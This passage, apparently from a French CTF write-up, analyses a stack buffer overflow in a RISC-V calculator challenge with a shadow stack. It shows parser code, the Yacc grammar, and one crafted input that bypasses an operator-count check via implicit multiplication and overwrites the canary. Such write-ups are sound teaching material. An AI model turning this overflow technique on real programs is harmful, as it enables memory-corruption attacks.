<text text-anchor='middle' x='336' y='20' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='336' y='68' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='336' y='148' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='336' y='196' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='336' y='324' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='336' y='372' fill='currentColor' style='font-size:1em'>N</text>
<text text-anchor='middle' x='336' y='804' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='336' y='932' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='336' y='980' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='344' y='20' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='344' y='324' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='344' y='372' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='344' y='804' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='352' y='148' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='352' y='324' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='352' y='372' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='352' y='580' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='352' y='852' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='352' y='932' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='360' y='20' fill='currentColor' style='font-size:1em'>D</text>
<text text-anchor='middle' x='360' y='148' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='360' y='324' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='360' y='372' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='360' y='804' fill='currentColor' style='font-size:1em'>D</text>
<text text-anchor='middle' x='360' y='932' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='368' y='20' fill='currentColor' style='font-size:1em'>F</text>
<text text-anchor='middle' x='368' y='68' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='368' y='196' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='368' y='804' fill='currentColor' style='font-size:1em'>F</text>
<text text-anchor='middle' x='368' y='980' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='376' y='20' fill='currentColor' style='font-size:1em'>S</text>
<text text-anchor='middle' x='376' y='148' fill='currentColor' style='font-size:1em'>D</text>
<text text-anchor='middle' x='376' y='324' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='376' y='372' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='376' y='804' fill='currentColor' style='font-size:1em'>S</text>
<text text-anchor='middle' x='376' y='932' fill='currentColor' style='font-size:1em'>D</text>
<text text-anchor='middle' x='384' y='148' fill='currentColor' style='font-size:1em'>F</text>
<text text-anchor='middle' x='384' y='324' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='384' y='372' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='384' y='468' fill='currentColor' style='font-size:1em'>N</text>
<text text-anchor='middle' x='384' y='852' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='384' y='932' fill='currentColor' style='font-size:1em'>F</text>
<text text-anchor='middle' x='392' y='148' fill='currentColor' style='font-size:1em'>S</text>
<text text-anchor='middle' x='392' y='324' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='392' y='372' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='392' y='468' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='392' y='660' fill='currentColor' style='font-size:1em'>3</text>
<text text-anchor='middle' x='392' y='932' fill='currentColor' style='font-size:1em'>S</text>
<text text-anchor='middle' x='400' y='68' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='400' y='196' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='400' y='324' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='400' y='372' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='400' y='468' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='400' y='980' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='408' y='324' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='408' y='372' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='408' y='468' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='416' y='324' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='416' y='372' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='416' y='852' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='424' y='324' fill='currentColor' style='font-size:1em'>√©</text>
<text text-anchor='middle' x='424' y='372' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='424' y='468' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='432' y='68' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='432' y='196' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='432' y='372' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='432' y='468' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='432' y='980' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='440' y='372' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='440' y='468' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='448' y='372' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='448' y='468' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='448' y='852' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='456' y='372' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='456' y='468' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='464' y='68' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='464' y='196' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='464' y='372' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='464' y='468' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='464' y='980' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='472' y='372' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='472' y='468' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='480' y='372' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='480' y='468' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='480' y='852' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='496' y='68' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='496' y='100' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='496' y='196' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='496' y='228' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='496' y='980' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='496' y='1012' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='504' y='100' fill='currentColor' style='font-size:1em'>5</text>
<text text-anchor='middle' x='504' y='228' fill='currentColor' style='font-size:1em'>5</text>
<text text-anchor='middle' x='504' y='1012' fill='currentColor' style='font-size:1em'>5</text>
<text text-anchor='middle' x='512' y='852' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='512' y='884' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='520' y='884' fill='currentColor' style='font-size:1em'>5</text>
</g>

    </svg>
  
</div>
<p>Voil√† ce que l&rsquo;on sait sur ces deux buffers:</p>
<ul>
<li>completed est un tableau de <code>bool</code>, il fait donc 16 * 1 octets.</li>
<li>results est un tableau de <code>int64_t</code>, il fait donc 16 * 8 octets (128 octets).</li>
<li>completed est plac√© en m√©moire juste avant results.</li>
</ul>
<p>Un overflow serait donc possible, mais il faut outrepasser la fonction count_ops qui nous empeche actuellement d&rsquo;overflow les deux buffers et pour voir comment faire, il faut se pencher sur les fichiers d&rsquo;analyse syntaxique, voil√† les fonctions qui g√®rent sont appell√©s par <code>Yacc</code> pour cr√©er de nouvelles nodes:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// calculator/ast/ast.y
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">node_t</span> <span class="o">*</span><span class="nf">node_new</span> <span class="p">(</span><span class="n">node_kind</span> <span class="n">kind</span><span class="p">,</span> <span class="kt">node_t</span> <span class="o">*</span><span class="n">node_l</span><span class="p">,</span> <span class="kt">node_t</span> <span class="o">*</span><span class="n">node_r</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">static</span> <span class="kt">uint8_t</span> <span class="n">node_count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kt">node_t</span> <span class="o">*</span><span class="n">node</span> <span class="o">=</span> <span class="p">(</span><span class="kt">node_t</span><span class="o">*</span><span class="p">)</span> <span class="nf">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">node_t</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">node</span><span class="o">-&gt;</span><span class="n">kind</span> <span class="o">=</span> <span class="n">kind</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">node</span><span class="o">-&gt;</span><span class="n">content</span><span class="p">.</span><span class="n">binop</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="n">node_count</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">node</span><span class="o">-&gt;</span><span class="n">content</span><span class="p">.</span><span class="n">binop</span><span class="p">.</span><span class="n">node_l</span> <span class="o">=</span> <span class="n">node_l</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">node</span><span class="o">-&gt;</span><span class="n">content</span><span class="p">.</span><span class="n">binop</span><span class="p">.</span><span class="n">node_r</span> <span class="o">=</span> <span class="n">node_r</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">node</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">node_t</span> <span class="o">*</span><span class="nf">node_new_number</span> <span class="p">(</span><span class="kt">int64_t</span> <span class="n">value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">node_t</span> <span class="o">*</span><span class="n">node</span> <span class="o">=</span> <span class="p">(</span><span class="kt">node_t</span><span class="o">*</span><span class="p">)</span> <span class="nf">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">node_t</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">node</span><span class="o">-&gt;</span><span class="n">kind</span> <span class="o">=</span> <span class="n">NODE_NUMBER</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">node</span><span class="o">-&gt;</span><span class="n">content</span><span class="p">.</span><span class="n">value</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">node</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Les nodes retourn√©es par ces fonctions font donc partie de la liste chain√©e repr√©sentant nos ASTs, seules les nodes retourn√©s par la fonction node_new sont associ√©es √† un id dans les deux buffers. En regardant attentivement comment Yacc parse notre expression on voit ceci:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">expression  : expression PLUS expression    { $$ = node_new(NODE_PLUS, $1, $3); }
</span></span><span class="line"><span class="cl">            | expression MINUS expression   { $$ = node_new(NODE_MINUS, $1, $3); }
</span></span><span class="line"><span class="cl">            | expression TIMES expression   { $$ = node_new(NODE_TIMES, $1, $3); }
</span></span><span class="line"><span class="cl">            | expression DIVIDE expression  { $$ = node_new(NODE_DIVIDE, $1, $3); }
</span></span><span class="line"><span class="cl">            | MINUS expression %prec NEG    { $$ = node_new(NODE_MINUS, node_new_number(0), $2); }
</span></span><span class="line"><span class="cl">            | expression POWER expression   { $$ = node_new(NODE_POWER, $1, $3); }
</span></span><span class="line"><span class="cl">            | factor                        { $$ = $1; }
</span></span><span class="line"><span class="cl">            ;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">factor  : NUMBER            { $$ = node_new_number($1); }
</span></span><span class="line"><span class="cl">        | NUMBER purefactor { $$ = node_new(NODE_TIMES, node_new_number($1), $2); }
</span></span><span class="line"><span class="cl">        | purefactor        { $$ = $1; }
</span></span><span class="line"><span class="cl">        ;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">purefactor  : LPARENTHESIS expression RPARENTHESIS            { $$ = $2; }
</span></span><span class="line"><span class="cl">            | LPARENTHESIS expression RPARENTHESIS purefactor { $$ = node_new(NODE_TIMES, $2, $4); }
</span></span><span class="line"><span class="cl">            ;
</span></span></code></pre></div><p>Il y&rsquo;a deux mani√®res de faire un produit, soit avec l&rsquo;expression <code>&lt;expression_0&gt; * &lt;expression_1&gt;</code>, mais il est aussi possible de faire: <code>&lt;expression_0&gt; (&lt;expression_1&gt;)</code>. Or la fonction count_ops ne prend pas en compte cette derni√®re mani√®re √©tant donn√© qu&rsquo;il ne fait que compter les symboles <code>+,-,*,/,**</code>, si l&rsquo;on essaie d&rsquo;envoyer une expression constitu√©e de 17 produits comme celle ci:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">challenger@6131181ffae8:~$ <span class="nb">printf</span> <span class="s1">&#39;1(1(1(1(1(1(1(1(1(1(1(1(1(1(1(1(1(1)))))))))))))))))&#39;</span> <span class="p">|</span> calculator
</span></span><span class="line"><span class="cl">&gt;&gt; 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">================================================</span>
</span></span><span class="line"><span class="cl">Shadow exception triggered!
</span></span><span class="line"><span class="cl"><span class="o">(</span>Conveniently handled as an illegal instruction<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">The current dark page is 0x0000004000955000
</span></span><span class="line"><span class="cl">The current dark offset is <span class="nv">0x8</span>
</span></span><span class="line"><span class="cl"><span class="o">================================================</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Illegal instruction <span class="o">(</span>core dumped<span class="o">)</span>
</span></span></code></pre></div><p>On a bien r√©ussi √† overflow la stack. Plus pr√©cis√©ment on a √©cras√© les 8 octets qui suivaient le buffer results qui correspondent au canary, au moment de retourner, le programme va donc appeller la fonction <code>__stack_chk_fail</code> qui comporte une instruction <code>jalr</code> √† un endroit et c&rsquo;est ce qui a d√©clench√© l&rsquo;exception, voil√† un sch√©ma:</p>



<div class="goat svg-container ">
  
    <svg
      xmlns="http://www.w3.org/2000/svg"
      font-family="Menlo,Lucida Console,monospace"
      
        viewBox="0 0 816 649"
      >
      <g transform='translate(8,16)'>
<path d='M 144,48 L 384,48' fill='none' stroke='currentColor'></path>
<path d='M 0,64 L 32,64' fill='none' stroke='currentColor'></path>
<path d='M 32,64 L 64,64' fill='none' stroke='currentColor'></path>
<path d='M 64,64 L 96,64' fill='none' stroke='currentColor'></path>
<path d='M 96,64 L 128,64' fill='none' stroke='currentColor'></path>
<path d='M 128,64 L 160,64' fill='none' stroke='currentColor'></path>
<path d='M 160,64 L 192,64' fill='none' stroke='currentColor'></path>
<path d='M 192,64 L 224,64' fill='none' stroke='currentColor'></path>
<path d='M 224,64 L 256,64' fill='none' stroke='currentColor'></path>
<path d='M 256,64 L 288,64' fill='none' stroke='currentColor'></path>
<path d='M 288,64 L 320,64' fill='none' stroke='currentColor'></path>
<path d='M 320,64 L 352,64' fill='none' stroke='currentColor'></path>
<path d='M 352,64 L 384,64' fill='none' stroke='currentColor'></path>
<path d='M 384,64 L 416,64' fill='none' stroke='currentColor'></path>
<path d='M 416,64 L 448,64' fill='none' stroke='currentColor'></path>
<path d='M 448,64 L 480,64' fill='none' stroke='currentColor'></path>
<path d='M 480,64 L 512,64' fill='none' stroke='currentColor'></path>
<path d='M 528,80 L 544,80' fill='none' stroke='currentColor'></path>
<path d='M 0,96 L 32,96' fill='none' stroke='currentColor'></path>
<path d='M 32,96 L 64,96' fill='none' stroke='currentColor'></path>
<path d='M 64,96 L 96,96' fill='none' stroke='currentColor'></path>
<path d='M 96,96 L 128,96' fill='none' stroke='currentColor'></path>
<path d='M 128,96 L 160,96' fill='none' stroke='currentColor'></path>
<path d='M 160,96 L 192,96' fill='none' stroke='currentColor'></path>
<path d='M 192,96 L 224,96' fill='none' stroke='currentColor'></path>
<path d='M 224,96 L 256,96' fill='none' stroke='currentColor'></path>
<path d='M 256,96 L 288,96' fill='none' stroke='currentColor'></path>
<path d='M 288,96 L 320,96' fill='none' stroke='currentColor'></path>
<path d='M 320,96 L 352,96' fill='none' stroke='currentColor'></path>
<path d='M 352,96 L 384,96' fill='none' stroke='currentColor'></path>
<path d='M 384,96 L 416,96' fill='none' stroke='currentColor'></path>
<path d='M 416,96 L 448,96' fill='none' stroke='currentColor'></path>
<path d='M 448,96 L 480,96' fill='none' stroke='currentColor'></path>
<path d='M 480,96 L 512,96' fill='none' stroke='currentColor'></path>
<path d='M 0,144 L 32,144' fill='none' stroke='currentColor'></path>
<path d='M 32,144 L 64,144' fill='none' stroke='currentColor'></path>
<path d='M 64,144 L 96,144' fill='none' stroke='currentColor'></path>
<path d='M 96,144 L 128,144' fill='none' stroke='currentColor'></path>
<path d='M 128,144 L 160,144' fill='none' stroke='currentColor'></path>
<path d='M 160,144 L 192,144' fill='none' stroke='currentColor'></path>
<path d='M 192,144 L 224,144' fill='none' stroke='currentColor'></path>
<path d='M 224,144 L 256,144' fill='none' stroke='currentColor'></path>
<path d='M 256,144 L 288,144' fill='none' stroke='currentColor'></path>
<path d='M 288,144 L 320,144' fill='none' stroke='currentColor'></path>
<path d='M 320,144 L 352,144' fill='none' stroke='currentColor'></path>
<path d='M 352,144 L 384,144' fill='none' stroke='currentColor'></path>
<path d='M 384,144 L 416,144' fill='none' stroke='currentColor'></path>
<path d='M 416,144 L 448,144' fill='none' stroke='currentColor'></path>
<path d='M 448,144 L 480,144' fill='none' stroke='currentColor'></path>
<path d='M 480,144 L 512,144' fill='none' stroke='currentColor'></path>
<path d='M 528,160 L 544,160' fill='none' stroke='currentColor'></path>
<path d='M 0,176 L 32,176' fill='none' stroke='currentColor'></path>
<path d='M 32,176 L 64,176' fill='none' stroke='currentColor'></path>
<path d='M 64,176 L 96,176' fill='none' stroke='currentColor'></path>
<path d='M 96,176 L 128,176' fill='none' stroke='currentColor'></path>
<path d='M 128,176 L 160,176' fill='none' stroke='currentColor'></path>
<path d='M 160,176 L 192,176' fill='none' stroke='currentColor'></path>
<path d='M 192,176 L 224,176' fill='none' stroke='currentColor'></path>
<path d='M 224,176 L 256,176' fill='none' stroke='currentColor'></path>
<path d='M 256,176 L 288,176' fill='none' stroke='currentColor'></path>
<path d='M 288,176 L 320,176' fill='none' stroke='currentColor'></path>
<path d='M 320,176 L 352,176' fill='none' stroke='currentColor'></path>
<path d='M 352,176 L 384,176' fill='none' stroke='currentColor'></path>
<path d='M 384,176 L 416,176' fill='none' stroke='currentColor'></path>
<path d='M 416,176 L 448,176' fill='none' stroke='currentColor'></path>
<path d='M 448,176 L 480,176' fill='none' stroke='currentColor'></path>
<path d='M 480,176 L 512,176' fill='none' stroke='currentColor'></path>
<path d='M 0,224 L 168,224' fill='none' stroke='currentColor'></path>
<path d='M 168,224 L 288,224' fill='none' stroke='currentColor'></path>
<path d='M 288,224 L 368,224' fill='none' stroke='currentColor'></path>
<path d='M 0,256 L 168,256' fill='none' stroke='currentColor'></path>
<path d='M 168,256 L 288,256' fill='none' stroke='currentColor'></path>
<path d='M 288,256 L 368,256' fill='none' stroke='currentColor'></path>
<path d='M 144,368 L 384,368' fill='none' stroke='currentColor'></path>
<path d='M 0,384 L 32,384' fill='none' stroke='currentColor'></path>
<path d='M 32,384 L 64,384' fill='none' stroke='currentColor'></path>
<path d='M 64,384 L 96,384' fill='none' stroke='currentColor'></path>
<path d='M 96,384 L 128,384' fill='none' stroke='currentColor'></path>
<path d='M 128,384 L 160,384' fill='none' stroke='currentColor'></path>
<path d='M 160,384 L 192,384' fill='none' stroke='currentColor'></path>
<path d='M 192,384 L 224,384' fill='none' stroke='currentColor'></path>
<path d='M 224,384 L 256,384' fill='none' stroke='currentColor'></path>
<path d='M 256,384 L 288,384' fill='none' stroke='currentColor'></path>
<path d='M 288,384 L 320,384' fill='none' stroke='currentColor'></path>
<path d='M 320,384 L 352,384' fill='none' stroke='currentColor'></path>
<path d='M 352,384 L 384,384' fill='none' stroke='currentColor'></path>
<path d='M 384,384 L 416,384' fill='none' stroke='currentColor'></path>
<path d='M 416,384 L 448,384' fill='none' stroke='currentColor'></path>
<path d='M 448,384 L 480,384' fill='none' stroke='currentColor'></path>
<path d='M 480,384 L 512,384' fill='none' stroke='currentColor'></path>
<path d='M 528,400 L 544,400' fill='none' stroke='currentColor'></path>
<path d='M 0,416 L 32,416' fill='none' stroke='currentColor'></path>
<path d='M 32,416 L 64,416' fill='none' stroke='currentColor'></path>
<path d='M 64,416 L 96,416' fill='none' stroke='currentColor'></path>
<path d='M 96,416 L 128,416' fill='none' stroke='currentColor'></path>
<path d='M 128,416 L 160,416' fill='none' stroke='currentColor'></path>
<path d='M 160,416 L 192,416' fill='none' stroke='currentColor'></path>
<path d='M 192,416 L 224,416' fill='none' stroke='currentColor'></path>
<path d='M 224,416 L 256,416' fill='none' stroke='currentColor'></path>
<path d='M 256,416 L 288,416' fill='none' stroke='currentColor'></path>
<path d='M 288,416 L 320,416' fill='none' stroke='currentColor'></path>
<path d='M 320,416 L 352,416' fill='none' stroke='currentColor'></path>
<path d='M 352,416 L 384,416' fill='none' stroke='currentColor'></path>
<path d='M 384,416 L 416,416' fill='none' stroke='currentColor'></path>
<path d='M 416,416 L 448,416' fill='none' stroke='currentColor'></path>
<path d='M 448,416 L 480,416' fill='none' stroke='currentColor'></path>
<path d='M 480,416 L 512,416' fill='none' stroke='currentColor'></path>
<path d='M 0,464 L 32,464' fill='none' stroke='currentColor'></path>
<path d='M 32,464 L 64,464' fill='none' stroke='currentColor'></path>
<path d='M 64,464 L 96,464' fill='none' stroke='currentColor'></path>
<path d='M 96,464 L 128,464' fill='none' stroke='currentColor'></path>
<path d='M 128,464 L 160,464' fill='none' stroke='currentColor'></path>
<path d='M 160,464 L 192,464' fill='none' stroke='currentColor'></path>
<path d='M 192,464 L 224,464' fill='none' stroke='currentColor'></path>
<path d='M 224,464 L 256,464' fill='none' stroke='currentColor'></path>
<path d='M 256,464 L 288,464' fill='none' stroke='currentColor'></path>
<path d='M 288,464 L 320,464' fill='none' stroke='currentColor'></path>
<path d='M 320,464 L 352,464' fill='none' stroke='currentColor'></path>
<path d='M 352,464 L 384,464' fill='none' stroke='currentColor'></path>
<path d='M 384,464 L 416,464' fill='none' stroke='currentColor'></path>
<path d='M 416,464 L 448,464' fill='none' stroke='currentColor'></path>
<path d='M 448,464 L 480,464' fill='none' stroke='currentColor'></path>
<path d='M 480,464 L 512,464' fill='none' stroke='currentColor'></path>
<path d='M 528,480 L 544,480' fill='none' stroke='currentColor'></path>
<path d='M 0,496 L 32,496' fill='none' stroke='currentColor'></path>
<path d='M 32,496 L 64,496' fill='none' stroke='currentColor'></path>
<path d='M 64,496 L 96,496' fill='none' stroke='currentColor'></path>
<path d='M 96,496 L 128,496' fill='none' stroke='currentColor'></path>
<path d='M 128,496 L 160,496' fill='none' stroke='currentColor'></path>
<path d='M 160,496 L 192,496' fill='none' stroke='currentColor'></path>
<path d='M 192,496 L 224,496' fill='none' stroke='currentColor'></path>
<path d='M 224,496 L 256,496' fill='none' stroke='currentColor'></path>
<path d='M 256,496 L 288,496' fill='none' stroke='currentColor'></path>
<path d='M 288,496 L 320,496' fill='none' stroke='currentColor'></path>
<path d='M 320,496 L 352,496' fill='none' stroke='currentColor'></path>
<path d='M 352,496 L 384,496' fill='none' stroke='currentColor'></path>
<path d='M 384,496 L 416,496' fill='none' stroke='currentColor'></path>
<path d='M 416,496 L 448,496' fill='none' stroke='currentColor'></path>
<path d='M 448,496 L 480,496' fill='none' stroke='currentColor'></path>
<path d='M 480,496 L 512,496' fill='none' stroke='currentColor'></path>
<path d='M 0,544 L 168,544' fill='none' stroke='currentColor'></path>
<path d='M 168,544 L 288,544' fill='none' stroke='currentColor'></path>
<path d='M 288,544 L 368,544' fill='none' stroke='currentColor'></path>
<path d='M 392,544 L 416,544' fill='none' stroke='currentColor'></path>
<path d='M 0,576 L 168,576' fill='none' stroke='currentColor'></path>
<path d='M 168,576 L 288,576' fill='none' stroke='currentColor'></path>
<path d='M 288,576 L 368,576' fill='none' stroke='currentColor'></path>
<path d='M 432,576 L 464,576' fill='none' stroke='currentColor'></path>
<path d='M 392,624 L 416,624' fill='none' stroke='currentColor'></path>
<path d='M 0,64 L 0,96' fill='none' stroke='currentColor'></path>
<path d='M 0,144 L 0,176' fill='none' stroke='currentColor'></path>
<path d='M 0,224 L 0,256' fill='none' stroke='currentColor'></path>
<path d='M 0,384 L 0,416' fill='none' stroke='currentColor'></path>
<path d='M 0,464 L 0,496' fill='none' stroke='currentColor'></path>
<path d='M 0,544 L 0,576' fill='none' stroke='currentColor'></path>
<path d='M 32,64 L 32,96' fill='none' stroke='currentColor'></path>
<path d='M 32,144 L 32,176' fill='none' stroke='currentColor'></path>
<path d='M 32,384 L 32,416' fill='none' stroke='currentColor'></path>
<path d='M 32,464 L 32,496' fill='none' stroke='currentColor'></path>
<path d='M 64,64 L 64,96' fill='none' stroke='currentColor'></path>
<path d='M 64,144 L 64,176' fill='none' stroke='currentColor'></path>
<path d='M 64,384 L 64,416' fill='none' stroke='currentColor'></path>
<path d='M 64,464 L 64,496' fill='none' stroke='currentColor'></path>
<path d='M 72,272 L 72,288' fill='none' stroke='currentColor'></path>
<path d='M 72,592 L 72,608' fill='none' stroke='currentColor'></path>
<path d='M 96,64 L 96,96' fill='none' stroke='currentColor'></path>
<path d='M 96,144 L 96,176' fill='none' stroke='currentColor'></path>
<path d='M 96,384 L 96,416' fill='none' stroke='currentColor'></path>
<path d='M 96,464 L 96,496' fill='none' stroke='currentColor'></path>
<path d='M 128,64 L 128,96' fill='none' stroke='currentColor'></path>
<path d='M 128,144 L 128,176' fill='none' stroke='currentColor'></path>
<path d='M 128,384 L 128,416' fill='none' stroke='currentColor'></path>
<path d='M 128,464 L 128,496' fill='none' stroke='currentColor'></path>
<path d='M 160,64 L 160,96' fill='none' stroke='currentColor'></path>
<path d='M 160,144 L 160,176' fill='none' stroke='currentColor'></path>
<path d='M 160,384 L 160,416' fill='none' stroke='currentColor'></path>
<path d='M 160,464 L 160,496' fill='none' stroke='currentColor'></path>
<path d='M 168,224 L 168,256' fill='none' stroke='currentColor'></path>
<path d='M 168,544 L 168,576' fill='none' stroke='currentColor'></path>
<path d='M 192,64 L 192,96' fill='none' stroke='currentColor'></path>
<path d='M 192,144 L 192,176' fill='none' stroke='currentColor'></path>
<path d='M 192,384 L 192,416' fill='none' stroke='currentColor'></path>
<path d='M 192,464 L 192,496' fill='none' stroke='currentColor'></path>
<path d='M 224,64 L 224,96' fill='none' stroke='currentColor'></path>
<path d='M 224,144 L 224,176' fill='none' stroke='currentColor'></path>
<path d='M 224,272 L 224,288' fill='none' stroke='currentColor'></path>
<path d='M 224,384 L 224,416' fill='none' stroke='currentColor'></path>
<path d='M 224,464 L 224,496' fill='none' stroke='currentColor'></path>
<path d='M 224,592 L 224,608' fill='none' stroke='currentColor'></path>
<path d='M 256,64 L 256,96' fill='none' stroke='currentColor'></path>
<path d='M 256,144 L 256,176' fill='none' stroke='currentColor'></path>
<path d='M 256,384 L 256,416' fill='none' stroke='currentColor'></path>
<path d='M 256,464 L 256,496' fill='none' stroke='currentColor'></path>
<path d='M 288,64 L 288,96' fill='none' stroke='currentColor'></path>
<path d='M 288,144 L 288,176' fill='none' stroke='currentColor'></path>
<path d='M 288,224 L 288,256' fill='none' stroke='currentColor'></path>
<path d='M 288,384 L 288,416' fill='none' stroke='currentColor'></path>
<path d='M 288,464 L 288,496' fill='none' stroke='currentColor'></path>
<path d='M 288,544 L 288,576' fill='none' stroke='currentColor'></path>
<path d='M 320,64 L 320,96' fill='none' stroke='currentColor'></path>
<path d='M 320,144 L 320,176' fill='none' stroke='currentColor'></path>
<path d='M 320,384 L 320,416' fill='none' stroke='currentColor'></path>
<path d='M 320,464 L 320,496' fill='none' stroke='currentColor'></path>
